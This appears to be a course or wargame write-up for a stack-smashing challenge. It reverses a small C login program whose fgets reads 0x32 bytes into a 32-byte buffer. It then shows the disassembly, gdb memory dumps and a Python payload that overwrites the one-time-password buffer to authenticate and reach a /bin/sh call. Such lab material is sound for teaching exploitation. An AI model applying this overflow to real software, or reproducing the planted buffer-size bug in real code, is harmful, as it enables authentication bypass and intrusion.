# Memory Corruption - Level 1

This is the first challenge in the Memory Corruption section of the course. As the name suggests, the focus of this section is to reverse engineer and analyse the program to find a flaw that will allow user input to corrupt the memory and control the execution flow of the program.

## The Mission - Secure Logon

"We've had access to this system for a long time, but recently, they've updated their login mechanism to include a secure, one-time token. Can you take a look at their implementation? Maybe we can find a way around it..."

## Source Code Review

```c
// gcc -g -no-pie -I ../includes/ -o 03_level_1 03_level_1.c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>

// Hidden for simplicity
#include "wargames.h"

void generate_otp(char * buffer, int len)
{
    // Read random bytes into given buffer
    FILE *fp = fopen("/dev/urandom", "r");
    int bytes_read = fread(buffer, 1, len, fp);
    fclose(fp);

    // Failure to read random bytes
    if (bytes_read != len)
        exit(1);

    // Convert raw random bytes to an ASCII letter in A-Z
    for (int i = 0; i < len; i++)
        buffer[i] = 0x41 + ((unsigned char)buffer[i] % 26);

    // Ensure the buffer is NULL terminated
    buffer[len-1] = 0;
}

void main()
{
	init_wargame();

    printf("------------------------------------------------------------\n");
    printf("--[ Stack Smashing Level #1 - Secure Logon                  \n");
    printf("------------------------------------------------------------\n");

    char user_password[32] = {};
    char otp_password[32] = {};

    // Generate a secure, one time password (OTP) for secure logon
    generate_otp(otp_password, sizeof(otp_password));

    // Prompt the user to enter a password
    printf("Enter password: ");
    fgets(user_password, 0x32, stdin);
    user_password[strcspn(user_password, "\n")] = 0;

    // Ensure the user entered password data
    if (strlen(user_password) == 0)
    {
        puts("Invalid input...");
        exit(1);
    }

    // Validate the given password
    if (!strcmp(user_password, otp_password))
    {
        puts("Authenticated!");
        system("/bin/sh");
    }
    else
    {
        puts("Authentication failed...");
    }

    // Exit the program / return from main
}

```

The C source code is fairly small, only consisting of two functions `main` and `generate_otp`. If we look at what's happening in the main function, we can see the following:

- Allocate two 32 byte buffers (one for `user_password` and the other for `otp_password`).
- Call the generate_otp function passing in the `otp_password` buffer and the size of the buffer.
- Prompt the user to enter their password.
- Call the fgets function with size `0x32` to save the user's password in the `user_password` buffer. 
- If no password is entered, exit the program with "Invalid input" error.
- If a password was entered, compare the `user_password` to the `otp_password` and authenticate the user if they match.

So from our review, we can see that we have to enter a string, which will get compared to another string which the program generates and we have no control over. Now we know a little more about what is happing, lets see if we can find an error in the code. 

## Where's the Bug?

The first thing to note is that we only have one place where we can send input to the program, and that is at the "Enter password:" prompt. When we enter our password, it is saved to the `user_password` buffer which has a size of `32` bytes. The program receives the user input with `fgets` and a size `0x32`. When useing `fgets` anything input the user sends that goes over the size limit will be discarded.


At first glance I looked at this and wondered, how can there be a bug? The code is using `fgets` with a size, so how can we overflow the buffer? :confused: 
When you look at the fgets statement again a little more carefully, there does infact appear to be a problem :hushed:

```c
fgets(user_password, 0x32, stdin);
```
A size is passed in to fgets, but `0x32` is not the same as `32` in decimal. The code actually allows the user to send 50 bytes (0x32) instead of the 32 byte limit that was probably intended. Since the `user_password` buffer can only hold 32 bytes (`char user_password[32] = {};`), this means it is possible to overflow the buffer :sweat_smile:


## Static Analysis

To get a better idea of what's happening in memory and at the assembly level, we'll review the disassembly for the main function, then run the binary with some input and review the stack.

### Disassembly

```asm
0x400b07:  push    rbp
0x400b08:  mov     rbp, rsp
0x400b0b:  sub     rsp, 0x50
0x400b0f:  mov     rax, qword [fs:0x28]
0x400b18:  mov     qword [rbp-0x8], rax
0x400b1c:  xor     eax, eax
0x400b1e:  mov     eax, 0x0
0x400b23:  call    init_wargame
0x400b28:  mov     edi, 0x400d30  "--------------------------------…"
0x400b2d:  call    puts
0x400b32:  mov     edi, 0x400d70  "--[ Stack Smashing Level #1 - Se…"
0x400b37:  call    puts
0x400b3c:  mov     edi, 0x400d30  "--------------------------------…"
0x400b41:  call    puts
0x400b46:  mov     qword [rbp-0x50], 0x0
0x400b4e:  mov     qword [rbp-0x48], 0x0
0x400b56:  mov     qword [rbp-0x40], 0x0
0x400b5e:  mov     qword [rbp-0x38], 0x0
0x400b66:  mov     qword [rbp-0x30], 0x0
0x400b6e:  mov     qword [rbp-0x28], 0x0
0x400b76:  mov     qword [rbp-0x20], 0x0
0x400b7e:  mov     qword [rbp-0x18], 0x0
0x400b86:  lea     rax, [rbp-0x30]
0x400b8a:  mov     esi, 0x20
0x400b8f:  mov     rdi, rax
0x400b92:  call    generate_otp
0x400b97:  mov     edi, 0x400dad  "Enter password: "
0x400b9c:  mov     eax, 0x0
0x400ba1:  call    printf
0x400ba6:  mov     rdx, qword [rel stdin]
0x400bad:  lea     rax, [rbp-0x50]
0x400bb1:  mov     esi, 0x32
0x400bb6:  mov     rdi, rax
0x400bb9:  call    fgets
0x400bbe:  lea     rax, [rbp-0x50]
0x400bc2:  mov     esi, 0x400dbe
0x400bc7:  mov     rdi, rax
0x400bca:  call    strcspn
0x400bcf:  mov     byte [rbp+rax-0x50], 0x0
0x400bd4:  lea     rax, [rbp-0x50]
0x400bd8:  movzx   eax, byte [rax]
0x400bdb:  test    al, al
0x400bdd:  jne     0x400bf3
0x400bdf:  mov     edi, 0x400dc0  "Invalid input..."
0x400be4:  call    puts
0x400be9:  mov     edi, 0x1
0x400bee:  call    exit
0x400bf3:  lea     rdx, [rbp-0x30]
0x400bf7:  lea     rax, [rbp-0x50]
0x400bfb:  mov     rsi, rdx
0x400bfe:  mov     rdi, rax
0x400c01:  call    strcmp
0x400c06:  test    eax, eax
0x400c08:  jne     0x400c20
0x400c0a:  mov     edi, 0x400dd1  "Authenticated!"
0x400c0f:  call    puts
0x400c14:  mov     edi, 0x400de0  "/bin/sh"
0x400c19:  call    system
0x400c1e:  jmp     0x400c2a
0x400c20:  mov     edi, 0x400de8  "Authentication failed..."
0x400c25:  call    puts
0x400c2a:  nop
0x400c2b:  mov     rax, qword [rbp-0x8]
0x400c2f:  xor     rax, qword [fs:0x28]
0x400c38:  je      0x400c3f
0x400c3a:  call    __stack_chk_fail
0x400c3f:  leave
0x400c40:  retn
```

We won't delve into every line of the disassembly, but there are a few key parts we should take note of: 

```asm
0x400b07:  push    rbp
0x400b08:  mov     rbp, rsp
0x400b0b:  sub     rsp, 0x50
```
These instructions push the old rbp (previous stack frame base address) to the stack and save the new stack frame base address (for our main function) in rbp. Following this, `0x50` (80 bytes) is subtracted from the stack. This lets us know that the stack frame for main will be 80 bytes and the first two items on the stack will be the return address (we go here after the exit main) and the old ebp.

```asm
0x400b46:  mov     qword [rbp-0x50], 0x0
0x400b4e:  mov     qword [rbp-0x48], 0x0
0x400b56:  mov     qword [rbp-0x40], 0x0
0x400b5e:  mov     qword [rbp-0x38], 0x0
0x400b66:  mov     qword [rbp-0x30], 0x0
0x400b6e:  mov     qword [rbp-0x28], 0x0
0x400b76:  mov     qword [rbp-0x20], 0x0
0x400b7e:  mov     qword [rbp-0x18], 0x0
```

The lines above setup the space on the stack for the two buffers `user_password` and `otp_password`. Since rbp is where the stack begins, the addresses are referenced as offsets to rbp, for example `rbp-0x50`. The stack grows from higher memory addresses to lower addresses, so the offsets are referenced as rbp `-` a variable size. We subtract from rbp when we want to create space on the stack (usually for local variables). Looking at the offsets, they all decrement by 0x8 and theres 8 lines in total, so 64 bytes altogether (2 * 32 byte buffers).


Buffers are contigous blocks of memory, so: 

```asm
0x400b46:  mov     qword [rbp-0x50], 0x0
0x400b4e:  mov     qword [rbp-0x48], 0x0
0x400b56:  mov     qword [rbp-0x40], 0x0
0x400b5e:  mov     qword [rbp-0x38], 0x0
```
will belong to one buffer, and: 

```asm
0x400b66:  mov     qword [rbp-0x30], 0x0
0x400b6e:  mov     qword [rbp-0x28], 0x0
0x400b76:  mov     qword [rbp-0x20], 0x0
0x400b7e:  mov     qword [rbp-0x18], 0x0
```
To the other buffer.


To find out which offsets belong to which buffer, we can which one of the offsets is used in the calls to `generate_otp` and `fgets`. The first one we see is the setup and call to `generate_otp`:

```asm
0x400b86:  lea     rax, [rbp-0x30]
0x400b8a:  mov     esi, 0x20
0x400b8f:  mov     rdi, rax
0x400b92:  call    generate_otp
```
As we can see here, the address of rbp-0x30 is put into the rax register and then moved to rdi. The rdi register is used as the first argument when calling a function. In x86_64 architecture, the arguments to functions are passed in reversed order, meaning the first argument appears last (right before the call to the function). The esi register is used as the second argument, and we can see this has a value of 0x20 (32). 


We have validated that the offsets `rbp-0x30` to `rbp-0x18` belong to the `otp_password` buffer, and offsets `rbp-0x50` to `rbp-0x38` belong to `user_password`. The final piece of Assembly we need to make a note of is how we get a successful authentication. 

```asm
0x400bf3:  lea     rdx, [rbp-0x30]
0x400bf7:  lea     rax, [rbp-0x50]
0x400bfb:  mov     rsi, rdx
0x400bfe:  mov     rdi, rax
0x400c01:  call    strcmp
0x400c06:  test    eax, eax
0x400c08:  jne     0x400c20
0x400c0a:  mov     edi, 0x400dd1  "Authenticated!"
```

The instructions here take the result from generated otp, saved in the `otp_password` buffer (rbp-0x30), and compare this with the `user_password` buffer (rbp-0x50). If the two are not equal, the program flow jumps to 0x400c20 and terminates. If the two match however, we will be authenticated.

## Dynamic Analysis

At this point, we have an idea of where our input will be on the stack and what condition we need to meet to be authenticated. We can start playing around with some input and inspecting the memory while the binary is running. Since we know the user_password buffer is 32 bytes, lets send 32 bytes with python and see how this looks. 


First, we place a break point on the call to fgets, then run the binary:

```gdb
break *0x400bb9
```

```gdb
wdb> run
Started '03_level_1'
------------------------------------------------------------
--[ Stack Smashing Level #1 - Secure Logon
------------------------------------------------------------
Breakpoint 0: 0x400bb9, main+178
wdb> x/10gx $rbp-0x50
0x7fffffffed80: 0x0000000000000000    0x0000000000000000
0x7fffffffed90: 0x0000000000000000    0x0000000000000000
0x7fffffffeda0: 0x5553525348585458    0x4a5a4b4e554e4d47
0x7fffffffedb0: 0x4258494f4649444f    0x005358494c5a4746
0x7fffffffedc0: 0x00007fffffffeeb0    0xe294998c38b05300
```
As mentioned, the program has stopped just before the call to `fgets` which will prompt us for a password. In gdb we use the `x/` command to examine memory in a register or memory address. This only works if there is a pointer or address in there. In this case, we have chosen to examine 10gx (10 giant words) which is 10 * 8 bytes from the memory location `rbp-0x50`. The reason for this is that we want to see the stack from top to bottom. Recall that the stack was allocated 80 bytes in our main function, so we are looking at 10 * 8 = (80 bytes) of memory. In x86-64 bit architecture, registers and memory addresses hold 64-bits of data (8 bytes)


When we look at the first lines from the output, we are seeing 32 bytes that are all set to 0. This is the user_password buffer which is currently initalised to to zero. The two lines further below it at 0x7fffffffeda0 and 0x7fffffffedb0 hold the values within otp_password buffer. At this point, we'll hit `ni` to move to the next instruction, then enter our password. To send 32 bytes, we'll used python to generate 32 A's:

```bash
$ python3
Python 3.8.2 (default, Dec 25 2020, 21:20:57)
>>> 'A' * 32
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
```

```gdb
wdb> ni
Enter password:
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x400bbe in main ()
wdb> x/10gx $rbp-0x50
0x7fffffffed80: 0x4141414141414141    0x4141414141414141
0x7fffffffed90: 0x4141414141414141    0x4141414141414141
0x7fffffffeda0: 0x555352534858000a    0x4a5a4b4e554e4d47
0x7fffffffedb0: 0x4258494f4649444f    0x005358494c5a4746
0x7fffffffedc0: 0x00007fffffffeeb0    0xe294998c38b05300
```
After sending in the 32 A's (0x41), we can see the top 32 bytes of the stack now contain our 32 `A` character as input.


This is where things get intersting. Recall the following: 

- The size given to fgets was 0x32, which allows us to send 50 bytes of data
- If we send more than 32 bytes of data, our input will flow into the buffer below user_password, which is the `otp_password` buffer
- To authenicate, a comparison is made between `rbp-0x30` and `rbp-0x50`.

If we can overwrite data at `rbp-0x30` within the 50 bytes of data we can send, then we can control the strings being compared. Lets take a look where rbp-0x30 is: 

```gdb
wdb> x/gx $rbp-0x30
0x7fffffffeda0: 0x555352534858000a
```
Since rbp-0x50 is only 32 bytes below rbp-0x30, it will only take 40 bytes to completely overwrite the memory at rbp-0x30. We can test this by stopping the binary and re-running with 32 'A's as input plus another 8 'B's:

```bash
>>> 'A' * 32 + 'B' * 8
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB'
```

```gdb
wdb> run
Started '03_level_1'
------------------------------------------------------------
--[ Stack Smashing Level #1 - Secure Logon
------------------------------------------------------------
Breakpoint 0: 0x400bb9, main+178
wdb> ni
Enter password:
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
0x400bbe in main ()
wdb> x/10gx $rbp-0x50
0x7fffffffed80: 0x4141414141414141    0x4141414141414141
0x7fffffffed90: 0x4141414141414141    0x4141414141414141
0x7fffffffeda0: 0x4242424242424242    0x414d4d49574e000a
0x7fffffffedb0: 0x5a584a5356495242    0x0052534843454556
0x7fffffffedc0: 0x00007fffffffeeb0    0xf8eb0d2099883200
```
As suspected, with 40 bytes, we can completely overwrite rbp-0x30. 


## Solving the Challenge

Now we have control over rbp-0x30 as well as our input at rbp-0x50, we have what we need to be authenticated. To solve the challenge, we create a python script which will do the following:

- Send 8 'A's into rbp-0x50 and 8 '\0' (NULL Bytes) into rbp-0x48, rbp-0x40 and rbp-0x38 (24 bytes).
- Send 8 'A's into rbp-0x30 and 8 '\0' (NULL Bytes) into rbp-0x28

The reason we have to use NULL bytes in our payload is to terminate the strings we want to compare, so only 8 bytes will compared, and not the whole 32 byte buffer. We use a python script to do this so we can send this directly into the process, rather than interactive prompt. This is because the null byte will terminate our string too early when using the interactive prompt.


```python
import interact
import struct

p = interact.Process()
data = p.readuntil('Enter password:')
p.sendline('A' * 8 + '\0' * 24  + 'A' * 8 + '\0' * 8)

p.interactive()
```

When we send the payload this time and check the memory in gdb, we see the following:

```gdb
wdb> x/10gx $rbp-0x50
0x7fffffffed80: 0x4141414141414141    0x0000000000000000
0x7fffffffed90: 0x0000000000000000    0x0000000000000000
0x7fffffffeda0: 0x4141414141414141    0x0000000000000000
0x7fffffffedb0: 0x445247534950000a    0x0055544554544655
0x7fffffffedc0: 0x00007fffffffeeb0    0x0d038f4d14f40000
```

At this point we can type continue in the debuger and see that we have authenticated. 
